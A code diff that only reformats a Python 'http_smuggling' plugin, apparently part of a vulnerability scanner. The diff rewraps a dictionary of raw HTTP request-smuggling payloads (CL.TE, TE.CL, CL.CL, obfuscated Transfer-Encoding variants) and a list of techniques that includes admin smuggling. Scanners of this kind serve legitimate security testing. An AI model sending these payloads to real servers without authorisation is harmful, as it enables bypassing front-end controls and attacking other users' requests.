@@ -4,7 +4,9 @@ import time
 
 # ──────────── SMUGGLING PAYLOADS ────────────
 SMUGGLE_PAYLOADS = {
-    "CL.TE": ("POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"),
+    "CL.TE": (
+        "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
+    ),
     "TE.CL": (
         "POST / HTTP/1.1\r\n"
         "Host: {target}\r\n"
@@ -20,7 +22,9 @@ SMUGGLE_PAYLOADS = {
         "Transfer-encoding: cow\r\n\r\n"
         "5c\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n"
     ),
-    "CL.CL": ("POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 0\r\nContent-Length: 6\r\n\r\nATTACK"),
+    "CL.CL": (
+        "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 0\r\nContent-Length: 6\r\n\r\nATTACK"
+    ),
     # 2026 additions
     "TE_SPACE": (
         "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 4\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nG"
@@ -173,6 +177,15 @@ def run(target, ip, open_ports, banners):
     return {
         "plugin": "http_smuggling",
         "versao": "2026.1",
-        "tecnicas": ["cl_te", "te_cl", "te_te", "cl_cl", "te_obfuscation", "time_based", "admin_smuggle", "raw_socket"],
+        "tecnicas": [
+            "cl_te",
+            "te_cl",
+            "te_te",
+            "cl_cl",
+            "te_obfuscation",
+            "time_based",
+            "admin_smuggle",
+            "raw_socket",
+        ],
         "resultados": vulns if vulns else "Nenhum HTTP smuggling detectado",
     }
